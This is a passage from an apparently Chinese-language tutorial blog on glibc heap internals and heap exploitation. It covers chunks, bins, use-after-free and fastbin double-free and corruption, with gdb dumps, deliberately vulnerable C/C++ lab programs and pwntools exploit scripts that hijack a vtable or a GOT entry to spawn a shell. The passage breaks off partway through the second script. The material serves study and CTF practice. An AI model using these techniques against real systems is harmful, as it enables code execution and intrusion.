<li>有哪些位置的内存可以分配</li>
<li>有哪些位置因为free可以回收</li>
<li>有哪些位置使用中则不需要记录，使用它们的人应该记住这些指标</li>
</ul>
</li>
<li><p>整个Heap的信息记录在一个malloc_state的struct中，称为main_arena</p>
</li>
<li><p>malloc分配的内存称为chunk，比要求的大小大一些，因为需要记录一些维护Heap用的额外信息</p>
</li>
<li><p>Arena和heap分配的内存分开存放，heap overflow无法直接覆盖掉它的部分</p>
</li>
<li><p>回收的chunk用linked list记录，称为bin</p>
</li>
<li><p>main_arena中有很多的bin，每个bin储存的size不同，目的是让malloc时可以找到最适合大小的chunk</p>
</li>
<li><p>回收的chunk会根据size来决定应该存放在哪个linked list（bin）中</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">main_arena&#123;</span><br><span class="line">    bin[0](size=16)-&gt;chunk1-&gt;chunk5</span><br><span class="line">    bin[1](size=32)-&gt;chunk2-&gt;chunk3-&gt;chunk4</span><br><span class="line">    bin[2](size=48)-&gt;chunk....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>malloc时，先从bin里面找可以使用的chunk，如果找不到才会真的分配新的内存给程序使用。分配时可以去找到足够大的chunk只切出需要的部分，剩下的部分会形成新的chunk</li>
<li>找不到可以用的chunk时会从top chunk里分配，top chunk是一个很大的chunk，代表可使用但是未分配的内存，malloc分配时从里面切一块下来，剩下的重新设置为top</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">main_arena&#123;</span><br><span class="line">    mchunkptr top-&gt;top_chunk;</span><br><span class="line">    mchunkptr last_remainder;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="编译glibc2-23时的一个问题"><a href="#编译glibc2-23时的一个问题" class="headerlink" title="编译glibc2.23时的一个问题"></a>编译glibc2.23时的一个问题</h3><blockquote>
<p>regexec.c:3856:29: error: ‘extra’ may be used uninitialized in this function [-Werror&#x3D;maybe-uninitialized]<br>    const unsigned char *coll_sym &#x3D; extra + cset-&gt;coll_syms[i];</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> CFLAGS=<span class="string">&quot;-g -g3 -ggdb -gdwarf-4 -Og -Wno-error&quot;</span> </span><br></pre></td></tr></table></figure>

<h3 id="使用docker时的一个问题"><a href="#使用docker时的一个问题" class="headerlink" title="使用docker时的一个问题"></a>使用docker时的一个问题</h3><p>为了契合glibc2.19版本，使用docker创建了一个ubuntu14.04的容器，在修改地址随机化时提示权限不够，其实就是创建docker时需要特权进入：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --privileged=<span class="literal">true</span> ubuntu:14.04 /bin/bash </span><br></pre></td></tr></table></figure>


<h3 id="Chunk"><a href="#Chunk" class="headerlink" title="Chunk"></a>Chunk</h3><ul>
<li>存放chunk metadata的chunk结构</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> prev_size;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    malloc_chunk *fd;</span><br><span class="line">    malloc_chunk *bk;</span><br><span class="line">    malloc_chunk *fd_nextsize;</span><br><span class="line">    malloc_chunk *bk_nextsize;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>64bit:mem&#x3D;malloc(size)<br>  -&gt; chunk&#x3D;mem-16;<br>  chunksize&#x3D;(size+8)#16 加8是为了给前一个chunk的data使用<ul>
<li>实际的chunk位置是malloc得到的地址+16</li>
<li>chunksize是size+8后向上对齐16得到的</li>
</ul>
</li>
</ul>
<h3 id="Chunk-Header标志位"><a href="#Chunk-Header标志位" class="headerlink" title="Chunk Header标志位"></a>Chunk Header标志位</h3><ul>
<li>size:该chunk在内存中的大小，不是malloc size</li>
<li>fd，bk：指向bin里的前一个后一个chunk<ul>
<li>一般来说bin就是double linked list</li>
</ul>
</li>
<li>prev_size:前一个chunk size，维护heap时可以得知前一个chunk位置</li>
</ul>
<h3 id="Size-64-bit"><a href="#Size-64-bit" class="headerlink" title="Size(64 bit)"></a>Size(64 bit)</h3><ul>
<li>size标志位包含chunk size以及flag bits</li>
<li>chunk size为把size标志位最低3 bit：<ul>
<li>fast bin&lt;&#x3D;128</li>
<li>small bin&lt;2014</li>
<li>large bin</li>
<li>mmap&gt;&#x3D;9x20000</li>
</ul>
</li>
<li>最低的bit为prev inuse bit,用来表示前一个chunk是否使用<ul>
<li>free会使下一个chunk的prev_inust bit被设置为0</li>
</ul>
</li>
</ul>
<h3 id="Heap操作"><a href="#Heap操作" class="headerlink" title="Heap操作"></a>Heap操作</h3><ul>
<li><p>p&#x3D;malloc(size)</p>
<ul>
<li>找出一个可用的chunk,或从top chunk切下一块来</li>
<li>如果这个chunk是回收的，要先从bin里面unlink，即移除unlinked list</li>
<li>填好结构，并回传chunk+16</li>
</ul>
</li>
<li><p>free(p)</p>
<ul>
<li>检查该chunk内存地址的前后chunk，是不是not inuse</li>
<li>如果有，则这些回收的内存可以合并</li>
<li>合并后的新chunk放到对应的bin中</li>
</ul>
</li>
</ul>
<h4 id="free-的例子"><a href="#free-的例子" class="headerlink" title="free 的例子"></a>free 的例子</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> *<span class="title">Malloc</span><span class="params">(<span class="type">size_t</span> sz)</span></span>&#123;</span><br><span class="line">  <span class="type">void</span> *p=<span class="built_in">malloc</span>(sz);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p = malloc(%ld)\n&quot;</span>,p,sz);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Free</span><span class="params">(<span class="type">void</span> *p)</span></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;free(%p)\n&#x27;,p&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="type">void</span> *p,*q,*r,*s;</span><br><span class="line">  p=<span class="built_in">malloc</span>(<span class="number">152</span>);</span><br><span class="line">  q=<span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="built_in">memset</span>(p,<span class="string">&#x27;A&#x27;</span>,<span class="number">152</span>);</span><br><span class="line">  <span class="built_in">free</span>(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>malloc完毕：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/36xg 0x0602000</span><br><span class="line">0x602000:       0x0000000000000000      0x00000000000000a1</span><br><span class="line">0x602010:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602020:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602030:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602040:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602050:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602060:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602070:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602080:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602090:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x6020a0:       0x0000000000000000      0x0000000000000021</span><br><span class="line">0x6020b0:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>meset完毕：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/36xg 0x602000 </span><br><span class="line">0x602000:       0x0000000000000000      0x00000000000000a1</span><br><span class="line">0x602010:       0x4141414141414141      0x4141414141414141</span><br><span class="line">0x602020:       0x4141414141414141      0x4141414141414141</span><br><span class="line">0x602030:       0x4141414141414141      0x4141414141414141</span><br><span class="line">0x602040:       0x4141414141414141      0x4141414141414141</span><br><span class="line">0x602050:       0x4141414141414141      0x4141414141414141</span><br><span class="line">0x602060:       0x4141414141414141      0x4141414141414141</span><br><span class="line">0x602070:       0x4141414141414141      0x4141414141414141</span><br><span class="line">0x602080:       0x4141414141414141      0x4141414141414141</span><br><span class="line">0x602090:       0x4141414141414141      0x4141414141414141</span><br><span class="line">0x6020a0:       0x4141414141414141      0x0000000000000021</span><br><span class="line">0x6020b0:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>free完毕：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/36xg 0x602000 </span><br><span class="line">0x602000:       0x0000000000000000      0x00000000000000a1</span><br><span class="line">0x602010:       0x00007ffff7dd4bb8      0x00007ffff7dd4bb8</span><br><span class="line">0x602020:       0x4141414141414141      0x4141414141414141</span><br><span class="line">0x602030:       0x4141414141414141      0x4141414141414141</span><br><span class="line">0x602040:       0x4141414141414141      0x4141414141414141</span><br><span class="line">0x602050:       0x4141414141414141      0x4141414141414141</span><br><span class="line">0x602060:       0x4141414141414141      0x4141414141414141</span><br><span class="line">0x602070:       0x4141414141414141      0x4141414141414141</span><br><span class="line">0x602080:       0x4141414141414141      0x4141414141414141</span><br><span class="line">0x602090:       0x4141414141414141      0x4141414141414141</span><br><span class="line">0x6020a0:       0x00000000000000a0      0x0000000000000020</span><br><span class="line">0x6020b0:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<h2 id="Exploit-UAF"><a href="#Exploit-UAF" class="headerlink" title="Exploit:UAF"></a>Exploit:UAF</h2><ul>
<li>和chunk，bin等heap内部操作没有关系</li>
<li>让程序的两个指标指向同一个内存<ul>
<li>一个是structure，另一个用作data buffer</li>
<li>利用对buffer的读写，修改或者泄露structure的内容</li>
</ul>
</li>
</ul>
<h3 id="利用chunk的回收特性"><a href="#利用chunk的回收特性" class="headerlink" title="利用chunk的回收特性"></a>利用chunk的回收特性</h3><ul>
<li><p>所谓UAF，就是free（p）掉后还继续使用它</p>
<ul>
<li>例如：linked list remove掉后，忘了把它指向的内容置为NULL，导致内容还留存在list中</li>
</ul>
</li>
<li><p>重新malloc（&#x3D;q）一样的大小，会拿到曾经free掉的chunk，此时就存在两个指针p,q指向同一片内存，使用这两个指针的操作会混在一起</p>
<ul>
<li>如：其中一个是C++的对象，有个vtable指针用来找出实际的function，如果另一个是可以写入的data buffer，就可以改掉function pointer。</li>
</ul>
</li>
</ul>
<p>one sample:</p>
<p>代码</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;class A&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>:<span class="keyword">public</span> A&#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;class B&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sh</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="built_in">system</span>(<span class="string">&quot;sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout,<span class="number">0</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  A *p=<span class="keyword">new</span> <span class="built_in">B</span>();</span><br><span class="line">  <span class="keyword">delete</span> p;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fgets</span>(buf,<span class="built_in">sizeof</span>(buf),stdin);</span><br><span class="line">  <span class="type">char</span>*q=<span class="built_in">strdup</span>(buf);</span><br><span class="line"></span><br><span class="line">  p-&gt;<span class="built_in">print</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行完</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fgets</span>(buf,<span class="built_in">sizeof</span>(buf),stdin);</span><br><span class="line"><span class="type">char</span>*q=<span class="built_in">strdup</span>(buf);</span><br></pre></td></tr></table></figure>

<p>gets内容为”AAAABBBB”后堆的内部变化：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/20xg 0x602000</span><br><span class="line">0x602000:       0x0000000000000000      0x0000000000000021</span><br><span class="line">0x602010:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602020:       0x0000000000000000      0x0000000000020fe1</span><br><span class="line">0x602030:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602040:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602050:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602060:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602070:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602080:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602090:       0x0000000000000000      0x0000000000000000</span><br><span class="line">gdb-peda$ lay src</span><br><span class="line">gdb-peda$ x/20xg 0x602000</span><br><span class="line">0x602000:       0x0000000000000000      0x0000000000000021</span><br><span class="line">0x602010:       0x4242424241414141      0x000000000000000a</span><br><span class="line">0x602020:       0x0000000000000000      0x0000000000020fe1</span><br><span class="line">0x602030:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602040:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602050:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602060:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602070:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602080:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602090:       0x0000000000000000      0x0000000000000000</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">4000</span>)</span><br><span class="line"></span><br><span class="line">sh_addr=<span class="number">0x40090D</span></span><br><span class="line">buf=<span class="number">0x601160</span></span><br><span class="line"></span><br><span class="line">io.sendline((p64(buf+<span class="number">8</span>)+p64(sh_addr)).ljust(<span class="number">20</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>堆：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x601160:0x601168 _Z2shv</span><br></pre></td></tr></table></figure>

<p>此时将0x601168当作虚表指针，指向了system(“sh”)，然后再追一次调用system(“sh”)。</p>
<h2 id="Fastbin-Corruption"><a href="#Fastbin-Corruption" class="headerlink" title="Fastbin Corruption"></a>Fastbin Corruption</h2><h3 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h3><ul>
<li><p>chunk size&lt;&#x3D;get_max_fast()的chunk，会被放在一系列称为fastbin的bin里</p>
<ul>
<li>64 bit是128 byte，32 bit是64 byt</li>
<li>global_max_fast 一开始是0</li>
</ul>
</li>
<li><p>Fastbin是single linked list，只使用fd，以NULL做结尾</p>
</li>
<li><p>Chunk size从32开始，共7个可以用的fastbin</p>
</li>
<li><p>free时不取消下一个chunk的inuse标志位，因为fastbin chunk不会和其它chunk合并</p>
</li>
<li><p>malloc，free操作时glibc会做一些检查，确认heap metadata是否正确，避免一些可能的攻击方式</p>
</li>
<li><p>为了效率，fastbin里的检查会比其他类型的bin少很多</p>
</li>
</ul>
<h3 id="fastbin-corruption"><a href="#fastbin-corruption" class="headerlink" title="fastbin corruption"></a>fastbin corruption</h3><ul>
<li>让fastbin linked list指向任意地址，之后malloc就是将该地址作为chunk拿出来</li>
<li>freed(not inuse) chunk才会存在bin里，修改它的fd才会造成corruption<ul>
<li>double free</li>
<li>overflow</li>
</ul>
</li>
</ul>
<h3 id="Fastbin-Sanity-Check"><a href="#Fastbin-Sanity-Check" class="headerlink" title="Fastbin Sanity Check"></a>Fastbin Sanity Check</h3><ul>
<li>malloc从bin里取出，要从正确的bin里拿出来，即chunk size要正确</li>
<li>free时，nextchunk size要对</li>
<li>free时会检查bin里第一个chunk是不是跟这个要free的chunk相同</li>
</ul>
<h3 id="fastbin-double-free"><a href="#fastbin-double-free" class="headerlink" title="fastbin double free"></a>fastbin double free</h3><ul>
<li>fasttop只检查bin里的第一个chunk，只要不是连续free同一个chunk就行</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"><span class="built_in">free</span>(q);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br></pre></td></tr></table></figure>

<p>bin形成了一个loop:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x602000:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x602010:	0x0000000000602030	0x0000000000000000</span><br><span class="line">0x602020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602030:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x602040:	0x0000000000602000	0x0000000000000000</span><br><span class="line">0x602050:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<ul>
<li><p>double free造成类似uaf的效果，可以改掉还在bin里的chunk的fd标志位</p>
<ul>
<li>bin是由fd连起来的linked list，改掉fd可以让linked list接往任意地址</li>
<li>多次malloc后，就可以拿到一个地址可以控制的chunk</li>
</ul>
</li>
<li><p>取出的chunk的size的标志位要正确，所以不是完全任意地址，要能构造假的size</p>
<ul>
<li>用stack上的变量作size，可以malloc一个stack上的地址</li>
<li>GOT上，用64bit地址最常见的0x40作size</li>
</ul>
</li>
<li><p>取得chunk后，有机会对该地址任意读写</p>
</li>
</ul>
<h3 id="Overflow-Freed-chunk"><a href="#Overflow-Freed-chunk" class="headerlink" title="Overflow Freed chunk"></a>Overflow Freed chunk</h3><ul>
<li>如果有heap overflow，可以覆盖下一个chunk的fd指标</li>
<li>先free掉下一个chunk再进行overflow</li>
<li>Overflow时要注意下一个chunk的size是否正确</li>
</ul>
<p>测试程序：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Problem Credit: seanwupi */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sh</span><span class="params">(<span class="type">char</span> *cmd)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">system</span>(cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  <span class="type">int</span> cmd, idx, sz;</span><br><span class="line">  <span class="type">char</span>* ptr[<span class="number">10</span>];</span><br><span class="line">  <span class="built_in">memset</span>(ptr, <span class="number">0</span>, <span class="built_in">sizeof</span>(ptr));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. malloc + gets\n2. free\n3. puts&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;cmd, &amp;idx);</span><br><span class="line">    idx %= <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">if</span> (cmd==<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d%*c&quot;</span>, &amp;sz);</span><br><span class="line">      ptr[idx] = <span class="built_in">malloc</span>(sz);</span><br><span class="line">      <span class="built_in">gets</span>(ptr[idx]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd==<span class="number">2</span>) &#123;</span><br><span class="line">      <span class="built_in">free</span>(ptr[idx]);</span><br><span class="line">      ptr[idx] = <span class="number">0</span> ;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd==<span class="number">3</span>) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(ptr[idx]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>覆盖地址方法（这里可能是libc版本的缘故，并没有在got表上下文中找到”\x40”作为fake chunk的size，所以做到填充的前一步），之后覆盖puts_got为system_addr，然后puts(3)即可：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">binary_name = <span class="string">&#x27;overflow1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	io = process(<span class="string">&#x27;./overflow1&#x27;</span>)</span><br><span class="line">    	<span class="comment">#libc = ELF(&#x27;./libc.so.6&#x27;,checksec=False)</span></span><br><span class="line">    	<span class="comment">#libc = ELF(&#x27;/lib/i386-linux-gnu/libc-2.23.so&#x27;,checksec=False)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    	io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">4000</span>)</span><br><span class="line">    	libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">bin</span> = ELF(<span class="string">&#x27;./&#x27;</span>+binary_name,checksec=<span class="literal">False</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">z</span>(<span class="params">a=<span 